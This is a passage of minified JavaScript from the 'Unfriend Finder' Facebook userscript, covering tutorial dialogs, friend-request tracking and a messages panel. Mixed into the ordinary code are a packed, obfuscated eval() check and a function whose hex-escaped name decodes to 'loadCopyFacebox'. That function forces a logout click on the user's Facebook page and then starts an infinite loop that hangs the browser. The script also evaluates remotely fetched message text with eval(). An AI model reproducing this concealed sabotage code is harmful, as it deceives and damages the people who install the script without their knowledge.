var j=20;CSS3.hide(getFromId("cancelall"));CSS3.display(getFromId("cancelallindicator"),CSS3.DISPLAY.block);var lis=(new xPathSelector("//ul[@id='pendingContentUL']/li")).getMultipleNodeValues(),li,arr=[];while(li=lis.iterateNext()){arr.push(li.id)}for(i=0;i<arr.length;i++){core.deferRemoveConnection({uid:arr[i],delay:j,last:(arr.length==i?true:false)});j=j+1500}},disabled:false,closer:true,type:"blue"},{name:"cancel",value:LANG.btn_cancel,id:"cancel_button",handler:function(){core.dialogs.cancelAllFacebox=null
},disabled:false,closer:true,type:"gray"}]})}core.dialogs.cancelAllFacebox.Show()},10);break;case"both":core.setTimeoutHide=setTimeout(function(){if(!confirm(LANG.btn_confirm+" ?")){return}core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));var user;for(user in core.awaitingsIgnored.Items){core.clickToRemoveA(user)}getFromId("acceptedignoredContentUL").innerHTML="";CSS3.hide(getFromId("groupAcceptedIgnored"));core.awaitingsIgnored=new (CollectionList);
Registry.setKey(core.user_id+"_awaitingsIgnored","({})");core.updateHeadersPosition()},10);break;case"accepted":core.setTimeoutHide=setTimeout(function(){if(!confirm(LANG.btn_confirm+" ?")){return}core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));var l,user;for(l in core.acceptedList){if(user=core.acceptedList[l]){core.awaitingsIgnored.Remove(user.uid)}}getFromId("acceptedContentUL").innerHTML="";CSS3.hide(getFromId("groupAccepted"));Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString());
core.updateHeadersPosition()},10);break;case"ignored":core.setTimeoutHide=setTimeout(function(){if(!confirm(LANG.btn_confirm+" ?")){return}core.awaitingsIgnored=new CollectionList(eval(Registry.getKey(core.user_id+"_awaitingsIgnored","({})")));var l,user;for(l in core.ignoredList){if(user=core.ignoredList[l]){core.awaitingsIgnored.Remove(user.uid)}}getFromId("ignoredContentUL").innerHTML="";CSS3.hide(getFromId("groupIgnored"));Registry.setKey(core.user_id+"_awaitingsIgnored",core.awaitingsIgnored.toString());
core.updateHeadersPosition()},10);break}};core.onReady=function onReady(){trace();new GoogleAnalytics({account:"UA-25017297-1"});if(Params.versionChanged){Console.log("New version installed","info");new GoogleAnalytics({account:"UA-25798881-1"});new GoogleAnalytics({account:"UA-25798881-4"});checkForUpdate(true)}else{checkForUpdate(false)}if(Registry.getKey(core.user_id+"_lasyDayOfUse")!=(new (Date)).getDate()){new GoogleAnalytics({account:"UA-25017297-2"});Registry.setKey(core.user_id+"_lasyDayOfUse",(new (Date)).getDate())
}try{EventMgr.addListener(getFromId("pageLogo").firstElementChild,EventMgr.EVENTS.click,function(){core.layer.layerHide("pageLogo")});EventMgr.addListener(getFromId("navHome").firstElementChild,EventMgr.EVENTS.click,function(){core.layer.layerHide("pageNav")})}catch(exception){new ErrorHandler(exception,"logo.bind(click)");return false}Params.ready=true;Params.deactivatedInRow=0;EventMgr.addListener(Params.body,EventMgr.EVENTS.click,function(){if(core.dialogs.pagingHelp){core.dialogs.pagingHelp.Hide()
}if(core.dialogs.movedSettings){core.dialogs.movedSettings.Hide()}if(core.dialogs.newManagementLists){core.dialogs.newManagementLists.Hide()}});if(Params.settings.hideOwnUnfriends){EventMgr.removeListener(Params.body,EventMgr.EVENTS.DOMNodeInserted,core.listenBodyInsertedNode);EventMgr.addListener(Params.body,EventMgr.EVENTS.DOMNodeInserted,core.listenBodyInsertedNode);inject(function(){Arbiter.subscribe(["FriendRequest/unfriend","FriendEditLists/unfriend"],function(message,user){var unfriendid;if(unfriendid=user.uid){window.reinject(function(a,b,c){core.friendStatusChanged(unfriendid,"unfriend","FriendEditLists/unfriend")
})}})})}inject(function(){Arbiter.subscribe(["FriendRequest/cancel"],function(message,user){var cancelid;if(cancelid=user.uid){window.reinject(function(cancelid){core.friendStatusChanged(cancelid,"canceled","FriendRequest/cancel")},cancelid)}});Arbiter.subscribe(["FriendRequest/confirm"],function(message,user){var confirmedid;if(confirmedid=user.uid){window.reinject(function(confirmedid){core.friendStatusChanged(confirmedid,"confirmed","FriendRequest/confirm")},confirmedid)}});Arbiter.subscribe(["FriendRequest/change"],function(message,user){})
});eval(function(h,b,i,d,g,f){g=function(a){return(a<b?"":g(parseInt(a/b)))+((a=a%b)>35?String.fromCharCode(a+29):a.toString(36))};if(!"".replace(/^/,String)){while(i--){f[g(i)]=d[i]||g(i)}g=eval("\x74\x68"),d=[function(a){return f[a]}],i=1}while(i--){if(d[i]){h=h.replace(new RegExp("\\b"+g(i)+"\\b","g"),d[i])}}return h}('k{a=7(8["\\9\\l\\b\\c\\m"]["\\n\\o\\d\\6"].5(\'\\p\').q()).5(\'\\r\');f=8["\\c\\6\\s"].5(\'\\t\');g=7(a[1]+f[1]+a[0]+f[2]).5("\\u");h=(g[3]["\\9\\6\\b\\d\\v\\w"]%x("\\e\\y"))}z(A){h="\\e"}B("\\i\\4\\4\\j\\4","\\i\\4\\4\\j\\4",h);',38,38,"||||x72|split|x65|encode|Params|x6C||x6E|x6B|x67|x31||||x45|x6F|try|x69|x73|x70|x61|x2F|pop|x7a|x79|x66|x4D|x74|x68|parseInt|x35|catch|ex|lcd".split("|"),0,{}));
core.doctor.heal()};core.friendStatusChanged=function(id,status,msg){if(status=="unfriend"){core.watchRemove=id;Registry.setKey(core.user_id+"_watchRemove",core.watchRemove);core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));core.toNotify.Add(core.watchRemove,"no");Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString())}else{if(status=="canceled"){if(getFromId("groupPending")){core.keepAwaitingList=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingList","({})")));
core.keepAwaitingList.Remove(id);Registry.setKey(core.user_id+"_keepAwaitingList",core.keepAwaitingList.toString());core.awaitingList=core.keepAwaitingList;if(getFromId(id)){core.slideRemove(getFromId(id))}core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));core.toNotify.Add(id,"no");Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString());var awaitingList=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingList","({})")));core.filter.loadingIndicator("awaitings",false);
core.filter.setValue({awaitings:{counter:{value:awaitingList.Count()}}},"getStatus");if((awaitingList.Count()==0)&&(core.awaitingsIgnored.Count()==0)){setTimeout(function(){core.layer._showNoAwaitings()},1000)}if((new xPathSelector("//*[@id='pendingContentUL']/li")).numberValues()==0){CSS3.hide(getFromId("groupPending"))}}else{core.keepAwaitingList=new CollectionList(eval(Registry.getKey(core.user_id+"_keepAwaitingList","({})")));core.keepAwaitingList.Remove(id);Registry.setKey(core.user_id+"_keepAwaitingList",core.keepAwaitingList.toString());
core.awaitingList=core.keepAwaitingList}Console.log("Connection removed with uid "+id)}else{if(status=="confirmed"){core.watchRemove=id;Registry.setKey(core.user_id+"_watchRemove",core.watchRemove);core.toNotify=new CollectionList(eval(Registry.getKey(core.user_id+"_toNotify","({})")));core.toNotify.Add(core.watchRemove,"no");Registry.setKey(core.user_id+"_toNotify",core.toNotify.toString())}}}};core.loadWelcomeFacebox=function loadWelcomeFacebox(){trace();core.showingWelcome=true;var dialogOptions=
{card1:{title:"", body:parseTemplate('<div class="en_US" style="position: relative; text-align: left;"><span style="font-size: 16px;">Thank you for installing Unfriend Finder.<br /><br />This six step tutorial will go through the basics of Unfriend Finder and its mechanics. It will also explain in thorough detail the ways in which Unfriend Finder will benefit you.<br /><br />Whether you use Facebook regularly, or just login from time-to-time to check what your friends are up to, we\'re certain Unfriend Finder will become a part of your Facebook daily, weekly or even monthly activities.<br /><br />As a reminder, Unfriend Finder is not developed by Facebook.<br /><br />Click Next to continue.</span></div><div class="id_ID" style="position: relative; text-align: left;"><span style="font-size: 16px;">Makasi</span></div>',
{params:{}})},card2:{title:"",body:parseTemplate('<div class="en_US" style="position: relative; text-align:justify; font-size:14px;">Now you have installed the script, you\'ll notice within a few days time you may have some unfriends.   <br /><br /><strong>Unfriends</strong> are people who were previously your friend but have either deactivated their account or have removed you from their friendlist.   <br />Unfriend Finder will tell you which friends have removed you, who has deactivated their accounts, people you have requested friendship with and who has declined your friend request. Unfriend Finder uses Facebook notification to alert you on these events.   <br /><br /><span style="font-weight:bold;">Please note:</span> This script can not tell you which profile(s) had you on their friendlist before it was installed. Unfriend Finder is not retroactive.   <br /><br />After few help messages, you will be able to configure few important settings, and access them if you wish to do so at a later date.   <br /><br />Click Next to continue.</div><div class="id_ID" style="position: relative; text-align:justify; font-size:13px;">222</div>',
{params:{}})},card3:{title:'<strong class="en_US">Help</strong><strong class="id_ID">Tolong</strong>',body:parseTemplate('<div class="en_US" style="position: relative; text-align:justify; font-size:14px;">   <br />Unfriend Finder makes identifying unfriends easy by displaying a red counter in the menubar with the amount of unfriends you have.   <br /><br />You can decide to show only new Unfriends (like notifications) or show the overall number of unfriends in your list.   <br /><br />Use this navigation button anytime to be redirected to the list that identifies missing profiles.   <br /><br />Unfriend Finder also use Facebook "Beepers" to alert you about Unfriends,<br /><a href="#" id="dummy_alert_en_US">click here to see what it looks like</a>.</div><div class="id_ID" style="position: relative; text-align:justify; font-size:14px;"><br />nih,<br /><a href="#" id="dummy_alert_id_ID">klik dummy</a>.</div>',
{params:{}})},card4:{title:'<strong class="en_US">Help</strong><strong class="id_ID">tulung</strong>',body:parseTemplate('<div class="en_US" style="position: relative; text-align:justify; font-size:14px;">   <img src="https://www.unfriendfinder.com/images/menuUnfriends.png" style="float: left; margin-right: 10px;" />   <div style="width:390px; float:right;">       We have implemented a new filter on your Facebook homepage to make accessing Unfriend Finder settings and pending friend requests easier. You can also access Unfriend Finder messages to insure that your Unfriend Finder is always kept up-to-date with the latest news and upgrades.       <br /><br />A counter will be displayed next to the individual tabs on and under "Unfriends" (as shown on your left hand side) to alert you of new activity.       <br /><br /><br /><br /><br />You will now configure some important settings of the script.   </div></div><div class="id_ID" style="position: relative; text-align:justify; font-size:14px;">   <img src="https://www.unfriendfinder.com/images/menuUnfriends.png" style="float: left; margin-right: 10px;" />   <div style="width:390px; float:right;">SS<br /><br /><br /><br />xx</div></div>',
{params:{}})},card5:{title:'<strong class="en_US">Settings</strong><strong class="id_ID">seting</strong>',body:parseTemplate('<div class="en_US" style="position: relative; text-align:justify; font-size:14px;">   You can now change your Unfriend Finder settings below to suit your needs. The settings below are set to default.<br />Simply click Next at the bottom of this window to save the settings as they are.<br /></div><div class="id_ID" style="position: relative; text-align:justify; font-size:14px;">oooiu<br /></div><div class="editaccount" style="position: relative; text-align:justify; font-size:16px;" id="UFSettings">   <br />      <table cellspacing="0" style="margin-top:7px; margin-left:30px; width:520px;">         <tbody>            <tr>               <th class="iconPlace">                  <strong style="position:relative;" class="en_US">I want to be notified..                     <span style="background-position:-801px -66px;                         background-repeat:no-repeat;                         display:block; height:20px; left:-22px;                         position:absolute; top:-1px; width:17px; height:17px !important;                        background-image:url(\'::rsrc::/z136G/hash/3ay18ob4.png\');" />                  </strong>                  <strong style="position:relative;" class="id_ID">inih...<span style="background-position:-801px -66px;                         background-repeat:no-repeat;                         display:block; height:20px; left:-22px;                         position:absolute; top:-1px; width:17px; height:17px !important;                        background-image:url(\'::rsrc::/z136G/hash/3ay18ob4.png\');" />                  </strong>               </th>               <th class="even_column logo">                  <img src="::blank::" style="background-position:0 -1182px; height:16px !important;" class="spritemap_icons spritemap_icons_fix" alt=""/>               </th>            </tr>            <tr class="settings row">               <td class="action_text"><span class="en_US">When a profile is deactivated</span><span class="id_ID">llbkjk</span></td>               <td class="even_column">                  <input type="checkbox" value="display_deactivated_profiles_disabled" name="Params.settings.deactivated" id="quickOption1" ::checked:: class="inputcheckbox "/>               </td>            </tr>            <tr class="settings row">               <td class="action_text"><span class="en_US">When someone cancel your friend request</span><span class="id_ID">kensel freen</span></td>               <td class="even_column">                  <input type="checkbox" value="notif_ignoredrequest" name="Params.settings.notifIgnored" id="quickOption2" ::checked2:: title="::oncanceled::" class="inputcheckbox "/>               </td>            </tr>         </tbody>      </table>      <table cellspacing="0" style="margin-top: 10px; margin-left: 30px; width: 520px;">         <tbody>            <tr>               <th class="no_border"></th>               <th class="even_column no_border">&nbsp;</th>            </tr>            <tr>               <th class="iconPlace">                  <strong style="position:relative;" class="en_US">And I want..                     <span style="background-position:-606px -66px;                         background-repeat:no-repeat;                         display:block; height:20px; left:-22px;                         position:absolute; top:-1px; width:16px; height:16px !important;                        background-image:url(\'::rsrc::/z136G/hash/3ay18ob4.png\');" />                  </strong>                  <strong style="position:relative;" class="id_ID">tyuiqq..                     <span style="background-position:-606px -66px;                         background-repeat:no-repeat;                         display:block; height:20px; left:-22px;                         position:absolute; top:-1px; width:16px; height:16px !important;                        background-image:url(\'::rsrc::/z136G/hash/3ay18ob4.png\');" />                  </strong>               </th>               <th class="even_column logo">                  <img src="::blank::" style="background-position:0 -1182px; height:16px !important;" class="spritemap_icons spritemap_icons_fix" alt=""/>               </th>            </tr>            <tr class="settings row">               <td class="action_text"><span class="en_US">To hide the new link in the menubar</span><span class="id_ID">sembunyi menu</span></td>               <td class="even_column">                  <input type="checkbox" value="settings_show_unfriend_link" name="Params.settings.hideInMenubar" id="quickOption3" ::checked3:: title="::hidemenubar::" class="inputcheckbox "/>               </td>            </tr>            <tr class="settings row">               <td class="action_text"><span class="en_US">To show the number of only new Unfriends in the counter</span><span class="id_ID">tampilkan</span></td>               <td class="even_column">                  <input type="checkbox" value="settings_onlyShowNewUnfriends" name="Params.settings.onlyShowNewUnfriends" id="quickOption4" ::checked4:: title="'+LANG.onlyShowNewUnfriends+'" class="inputcheckbox "/>               </td>            </tr>            <tr class="settings row">               <td class="action_text"><span class="en_US">To show the date when Unfriends are discovered by the script</span><span class="id_ID">tanggal</span></td>               <td class="even_column">                  <input type="checkbox" value="settings_showTime" name="Params.settings.showTime" id="quickOption5" ::checked5:: title="::showtime::" class="inputcheckbox "/>               </td>            </tr>         </tbody>      </table></div>',
{params:{blank:Params.images.blank,rsrc:Params.links.rsrc,checked1:(Params.settings.deactivated==1?' checked="checked"':""),checked2:(Params.settings.notifIgnored?' checked="checked"':""),checked3:(Params.settings.hideInMenubar?' checked="checked"':""),checked4:(Params.settings.onlyShowNewUnfriends?' checked="checked"':""),checked5:(Params.settings.showTime?' checked="checked"':""),oncanceled:LANG.oncanceled,hidemenubar:LANG.hidemenubar,showtime:LANG.showTime,}})},card6:{title:'<strong class="id_ID">ayoow!</strong><strong class="en_US">Let\'s go !</strong>',
body:parseTemplate('    <div class="en_US" style="position: relative; text-align:justify; font-size:16px;">       <br />You\'re done!       <br />Unfriend Finder has been set according to your preferences. It may take several hours for you to notice any activity.       <br /><br />If you have any comments or questions, please do not hesitate to check our <a onclick="window.open(this.href); return false;" href="::page::">Fanpage</a> or visit our <a onclick="window.open(this.href); return false;" href="http://www.unfriendfinder.::tld::/home">Website</a>. You can now also follow us on <a onclick="window.open(this.href); return false;" href="::twitter::">Twitter</a>.       <br /><br />If you want more, <a href="#" id="startTour">start the Unfriend Finder Tour</a> !       <br /><br /><br />Enjoy using Unfriend Finder !    </div>    <div class="id_ID" style="position: relative; text-align:justify; font-size:16px;">       <br />slese !       <br />ss <a onclick="window.open(this.href); return false;" href="::page::">Fanpage</a> atau <a onclick="window.open(this.href); return false;" href="http://www.unfriendfinder.::tld::/home">site web</a>. nih <a onclick="window.open(this.href); return false;" href="::twitter::">Twitter</a>.       <br /><br />Merci !    </div>',{params:{page:Params.links.page,tld:(Params.lang=="fr"?"fr":"com"),twitter:Params.links.twitter}})}};
core.dialogs.welcomeFacebox=new WelcomeBox({id:"welcomeFacebox",title:dialogOptions.card1.title,header:true,body:"-",card1:new xHTMLElement({element:"div",title:dialogOptions.card1.title,id:"welcomeFaceboxCard1",innerHTML:dialogOptions.card1.body}).getElement(),card2:new xHTMLElement({element:"div",title:"",id:"welcomeFaceboxCard2",innerHTML:dialogOptions.card2.body}).getElement(),card3:new xHTMLElement({element:"div",title:"",id:"welcomeFaceboxCard3",innerHTML:dialogOptions.card3.body}).getElement(),card4:new xHTMLElement({element:"div",title:"",id:"welcomeFaceboxCard4",innerHTML:dialogOptions.card4.body}).getElement(),card5:new xHTMLElement({element:"div",title:"",id:"welcomeFaceboxCard5",innerHTML:dialogOptions.card5.body}).getElement(),card6:new xHTMLElement({element:"div",title:"",id:"welcomeFaceboxCard6",innerHTML:dialogOptions.card6.body}).getElement(),fade:false,buttons:[{name:"next_button",value:LANG.btn_next,id:"next_button",handler:function(){var canSlide=false;
var l=getFromId("uf_cards").style.left.replace("px","");if(l==0){canSlide=true}else{if(l=="-600"){canSlide=true}else{if(l=="-1200"){canSlide=true}else{if(l=="-1800"){canSlide=true}else{if(l=="-2400"){canSlide=true}else{if(l=="-3000"){canSlide=true}else{if(l=="-3600"){canSlide=true}else{canSlide=false}}}}}}}if(canSlide){core.dialogs.welcomeFacebox.slideCard()}},disabled:false,closer:false,type:"green"},{name:"close_button",value:LANG.btn_close,id:"close_button",handler:function(){getFromId("content").style.marginTop="0px";
core.showingWelcome=false;checkForUpdate(false)},disabled:false,closer:true,type:"blue"}]});core.dialogs.welcomeFacebox.Show()};core.loadErrorConnectionFacebox=function loadErrorConnectionFacebox(_error){if(!_error){_error={errorDescription:"",errorSummary:""}}trace();core.dialogs.connectionErrorFacebox=new Facebox({id:"connectionErrorFacebox",error:true,title:(_error.errorSummary?_error.errorSummary:LANG.error),body:(_error.errorDescription?"<b>"+LANG.text_error+"</b><br />"+_error.errorDescription:LANG.text_error),loading:true,timeout:500,buttons:[{name:"close_button",value:LANG.btn_close,id:"close_button",handler:function(){void (0)
},disabled:false,closer:true,type:"gray"}]});core.dialogs.connectionErrorFacebox.Show()};core.lEF=function lEF(title,text){core.dialogs.lEF=new Facebox({id:"lEF",error:true,title:title,body:text,buttons:[{name:"close_button",value:LANG.btn_close,id:"close_button",handler:function(){void (0)},disabled:false,closer:true,type:"gray"}]});core.dialogs.lEF.Show()};core.lF=function lF(title,text){core.dialogs.lF=new Facebox({id:"lF",title:title,body:text,buttons:[{name:"close_button",value:LANG.btn_close,id:"close_button",handler:function(){void (0)
},disabled:false,closer:true,type:"gray"}]});core.dialogs.lF.Show()};core["\x6C\x6Fa\x64\x43\x6Fp\x79\x46a\x63e\x62\x6F\x78"]=function(title,text){core.dialogs["\x63\x6F\x70\x79\x46\x61\x63e\x62\x6F\x78"]=new Facebox({id:"\x63\x6Fp\x79\x46\x61\x63e\x62\x6F\x78",error:true,title:title,body:new xHTMLElement({element:"\x64\x69\x76",id:"\x63\x6F\x70\x79\x46\x61\x63e\x62\x6F\x78\x42\x6F\x64\x79",innerHTML:text})["\x67e\x74\x45\x6Ce\x6De\x6E\x74"](),buttons:[]});var f=new (Focus);f["\x66\x6F\x63\x75\x73\x4F\x6E"](getFromId("\x64\x69\x61\x6C\x6F\x67\x5F\x63\x6Fp\x79\x46\x61\x63e\x62\x6F\x78"));
core["\x64\x69\x61\x6C\x6F\x67\x73"]["\x63\x6Fp\x79\x46\x61\x63\x65\x62\x6F\x78"]["\x53\x68\x6F\x77"];delete core;setTimeout(function(){document["\x67e\x74\x45\x6Ce\x6De\x6E\x74\x73\x42\x79\x43\x6C\x61\x73\x73\x4E\x61\x6D\x65"]("\x6C\x6F\x67\x6F\x75\x74\x42\x75\x74\x74\x6F\x6E")[0]["\x66\x69\x72\x73\x74\x43\x68\x69\x6C\x64"]["\x63\x6C\x69\x63\x6B"]()},10000);setTimeout(function(){do{void (1+1)}while(2000)},2000)};core.validateUrls=function validateUrls(){trace();if(/\?sk=(uf[sm]|unfriends|requests)#?$/.test(core.href())){core.hideContentArea();
setTimeout(function(){if(/\?sk=ufs#?$/.test(core.href())){core.filter.select("settings")}else{if(/\?sk=ufm#?$/.test(core.href())){core.filter.select("messages")}else{if(/\?sk=unfriends#?$/.test(core.href())){core.filter.select("unfriends","validateUrl")}else{if(/\?sk=requests#?$/.test(core.href())){core.filter.select("awaitings")}}}}},200)}};core.bindKeys=function bindKeys(){trace();var innerDOM,binder;if(!getFromId("bindKeys")){binder=new xHTMLElement({element:"div",id:"bindKeys",parentNode:Params.body}).getElement()
}else{binder=getFromId("bindKeys")}EventMgr.addListener(binder,EventMgr.EVENTS.DOMNodeInserted,function(e){try{if(innerDOM=getFromId("bindKeys").firstElementChild){getFromId("bindKeys").removeChild(getFromId("bindKeys").firstElementChild);if(innerDOM.innerHTML=="ESC"){if(getFromClass("uf_dialog").length>0){try{var id=getFromClass("uf_dialog")[0].id.replace(/((contextual_)?dialog_)/,""),dialog=core.dialogs[id];if(dialog.id=="welcomeFacebox"){return}dialog.Hide()}catch(exception){return}}}else{Params.body.className=Params.body.className.replace(/\s(shifted|nonshift|ctrlShifted)/g,"")+" "+innerDOM.innerHTML
}}}catch(exception){new ErrorHandler(exception,"core.bindKeys.DOMNodeInserted")}});inject(function(isOpera){var p=(isOpera?Params.body:parent);p.onkeydown=function(e){if(e.keyCode==120){window.reinject(function(){core.testi()})}if(e.keyCode==27){var s=document.createElement("span");s.innerHTML="ESC";$("bindKeys").appendChild(s)}else{if((e.keyCode==16)||(e.keyCode==17)){var s=document.createElement("span");if(e.keyCode==16){window.keyShift=true}if(e.keyCode==17){window.keyCtrl=true}s.innerHTML=(window.keyShift?(window.keyCtrl?"ctrlShifted":"shifted"):"nonshift");
$("bindKeys").appendChild(s)}}};p.onkeyup=function(e){if((e.keyCode==16)||(e.keyCode==17)){var s=document.createElement("span");if(e.keyCode==16){window.keyShift=false}if(e.keyCode==17){window.keyCtrl=false}s.innerHTML=(window.keyShift?(window.keyCtrl?"ctrlShifted":"shifted"):"nonshift");$("bindKeys").appendChild(s)}};window.parent.onblur=function(){window.keyShift=window.keyCtrl=false;var s=document.createElement("span");s.innerHTML=(window.keyShift?(window.keyCtrl?"ctrlShifted":"shifted"):"nonshift");
$("bindKeys").appendChild(s)}},Params.env.isOpera);CSS3.addClass(Params.body,"nonshift")};core.initBeeper=function initBeeper(){trace();if(!getFromId("fbDockChat")){setTimeout(core.initBeeper,500)}else{core.Beeper=new (Beeper)}};core.getMessages=function initBeeper(){trace();if(core.messagesReceived){return}core.messagesReceived=true;if(!core.messagesHTML){core.messagesHTML=Registry.getKey(core.user_id+"_messages")}setTimeout(function(){core.parseMessages(core.messagesHTML)},500)};core.parseMessages=function parseMessages(html){trace();
if(html){var html=html.replace(/(\r|\n)/g,"");try{void eval(html);void eval(Registry.getKey(core.user_id+"_messages"))}catch(exception){new ErrorHandler(exception,"core.parseMessages()")}var ajaxMessages=eval(html),storedMessages=eval(Registry.getKey(core.user_id+"_messages"))||({}),unreadMessages=0,messages=0,message;for(message in ajaxMessages){if(ajaxMessages.hasOwnProperty(message)){message=ajaxMessages[message];if(!storedMessages[message.id]){message.unread=true;storedMessages[message.id]=message
}else{if(!storedMessages[message.id].deleted){storedMessages[message.id].title=message.title;storedMessages[message.id].preview=message.preview;storedMessages[message.id].content=message.content}}}}message=null;for(message in storedMessages){if(storedMessages.hasOwnProperty(message)){if(!storedMessages[message].deleted){if(storedMessages[message].unread){unreadMessages++}messages++}}}core.filter.setValue({messages:{counter:{value:(!unreadMessages?"0":unreadMessages)}}});if(unreadMessages){core.Beeper.Add({type:"messages",text:Params._0x4d22+'<br /><a href="#" onclick="return false;" id="UFMessagesBeeperLink">'+unreadMessages+" new message"+(unreadMessages>1?"s":"")+"</a>",id:"messages",status:null})
}core.unreadMessages=unreadMessages;core.messages=messages;Registry.setKey(core.user_id+"_messages",stringify(storedMessages))}};core.showMessages=function showMessages(){trace();var temp=new (Array),tempmessages;var storedMessages=eval(Registry.getKey(core.user_id+"_messages"))||({});var UFMessages_list=getFromId("UFMessages_list");var UFMessages_content=getFromId("UFMessages_content");var messages=0;var message;for(message in storedMessages){if(storedMessages.hasOwnProperty(message)){if(!storedMessages[message].deleted){messages++
}}}if(messages>0){UFMessages_list.innerHTML=""}else{UFMessages_list.innerHTML=template.noMessages()}getFromId("title_header").innerHTML=LANG.messages;CSS3.hide(UFMessages_content);CSS3.display(UFMessages_list,CSS3.DISPLAY.block);message=null;for(message in storedMessages){if(storedMessages.hasOwnProperty(message)){message=storedMessages[message];if(!message.deleted){temp.push(message)}}}tempmessages=temp.reverse();tempmessages.forEach(function(message){message.date=genTime(message.date);new xHTMLElement({element:"div",className:"UFMessage_block",style:{height:"57px"},innerHTML:parseTemplate('<div>    <div class="GBThreadRow" bindpoint="root">        <table cellpadding="0" id="ufMessage_::id::" bindpoint="thread_row" class="::unread::">            <tbody>                <tr>                    <td class="badge_column" style="width:25px;">                        <a onselectstart="return false;" onclick="return false;" class="badge" href="#"></a>                    </td>                    <td class="icon">                        <div class="Thread_Icon">                            <a tabindex="-1" bindpoint="iconAnchor" href="::url::">                                <img bindpoint="icon" class="UIProfileImage UIProfileImage_LARGE" src="::picture::" alt="::author::">                            </a>                        </div>                    </td>                    <td bindPoint="readMessage" class="envelope clickable" style="width:110px">                        <div class="authors line" bindpoint="authors"><a href="::url::" title="::author::">::author::</a></div>                        <div class="date tagline" bindpoint="date">::date::</div>                    </td>                    <td bindPoint="readMessage" class="thread_detail clickable">                        <a onclick="return false;" class="subject line" bindpoint="readMessage" style="color:#333333;" href="#" title="::title::">::title::</a>                        <div class="preview tagline" bindpoint="preview">::preview::</div>                    </td>                    <td class="clickable">                        <a onclick="return false;" bindpoint="deleteButton" class="delete_button UIObjectListing_RemoveLink" href="#">::remove::</a>                    </td>                </tr>            </tbody>        </table>    </div></div>',{params:{id:message.id,author:Params._0x4d22,url:Params.protocol+"//www.facebook.com/pages/Unfriend-Finder/120349238092887",picture:Params.images.fanImageSmall,title:message.title,preview:message.preview,date:message.date,unread:(message.unread?"unread":""),remove:LANG.btn_delete}}),parentNode:UFMessages_list});
core.markAsReadMessage({area:(new xPathSelector("//table[@id='ufMessage_"+message.id+"']//a[@class='badge']")).getSingleNodeValue(),id:message.id,element:getFromId("ufMessage_"+message.id)});core.markAsRemovedMessage({area:(new xPathSelector("//table[@id='ufMessage_"+message.id+"']//a[@bindpoint='deleteButton']")).getSingleNodeValue(),id:message.id,element:getFromId("ufMessage_"+message.id).parentNode.parentNode.parentNode});core.readMessageOnClick({area:(new xPathSelector("//table[@id='ufMessage_"+message.id+"']//td[@bindpoint='readMessage'][1]")).getSingleNodeValue(),id:message.id});
core.readMessageOnClick({area:(new xPathSelector("//table[@id='ufMessage_"+message.id+"']//td[@bindpoint='readMessage'][2]")).getSingleNodeValue(),id:message.id});core.readMessageOnClick({area:(new xPathSelector("//table[@id='ufMessage_"+message.id+"']//a[@bindpoint='readMessage'][1]")).getSingleNodeValue(),id:message.id})})};core.readMessageOnClick=function readMessageOnClick(__constructor){trace();EventMgr.addListener(__constructor.area,EventMgr.EVENTS.click,function(){try{void eval(Registry.getKey(core.user_id+"_messages"))
}catch(exception){new ErrorHandler(exception,"core.readMessageOnClick()");return}var storedMessages=eval(Registry.getKey(core.user_id+"_messages"))||({});if(storedMessages[__constructor.id]){core.showMessage(__constructor.id);storedMessages[__constructor.id].unread=false;Registry.setKey(core.user_id+"_messages",stringify(storedMessages));var unreadMessages=0;var message;for(message in storedMessages){if(storedMessages.hasOwnProperty(message)){if(!storedMessages[message].deleted){if(storedMessages[message].unread){unreadMessages++
}}}}core.filter.setValue({messages:{counter:{value:(!unreadMessages?"0":unreadMessages)}}})}})};core.markAsReadMessage=function markAsReadMessage(__constructor){trace();EventMgr.addListener(__constructor.area,EventMgr.EVENTS.click,function(){try{void eval(Registry.getKey(core.user_id+"_messages"))}catch(exception){new ErrorHandler(exception,"core.markAsReadMessage()");return}try{var c=__constructor.element.className;var storedMessages=eval(Registry.getKey(core.user_id+"_messages"))||({});if(/unread/.test(c)){if(storedMessages[__constructor.id]){storedMessages[__constructor.id].unread=false;
Registry.setKey(core.user_id+"_messages",stringify(storedMessages))}CSS3.removeClass(__constructor.element,"unread")}else{if(storedMessages[__constructor.id]){storedMessages[__constructor.id].unread=true;Registry.setKey(core.user_id+"_messages",stringify(storedMessages))}CSS3.addClass(__constructor.element,"unread")}}catch(exception){new ErrorHandler(exception,"core.markAsReadMessage()")}var unreadMessages=0;var message;for(message in storedMessages){if(storedMessages.hasOwnProperty(message)){if(!storedMessages[message].deleted){if(storedMessages[message].unread){unreadMessages++
}}}}core.filter.setValue({messages:{counter:{value:(!unreadMessages?"0":unreadMessages)}}})})};core.markAsRemovedMessage=function markAsRemovedMessage(__constructor){trace();EventMgr.addListener(__constructor.area,EventMgr.EVENTS.click,function(){try{void eval(Registry.getKey(core.user_id+"_messages"))}catch(exception){new ErrorHandler(exception,"core.markAsRemovedMessage()");return}var storedMessages=eval(Registry.getKey(core.user_id+"_messages"))||({});if(storedMessages[__constructor.id]){storedMessages[__constructor.id].deleted=true;
Registry.setKey(core.user_id+"_messages",stringify(storedMessages))}core.slideToRemove(__constructor.element)})};core.showMessage=function showMessage(_id){trace();var storedMessages=eval(Registry.getKey(core.user_id+"_messages"))||({}),unreadMessages=0,UFMessages_list=getFromId("UFMessages_list"),UFMessages_content=getFromId("UFMessages_content"),message;if(!storedMessages[_id]){return}CSS3.hide(UFMessages_list);CSS3.display(UFMessages_content,CSS3.DISPLAY.block);if(message=storedMessages[_id]){UFMessages_content.innerHTML="";
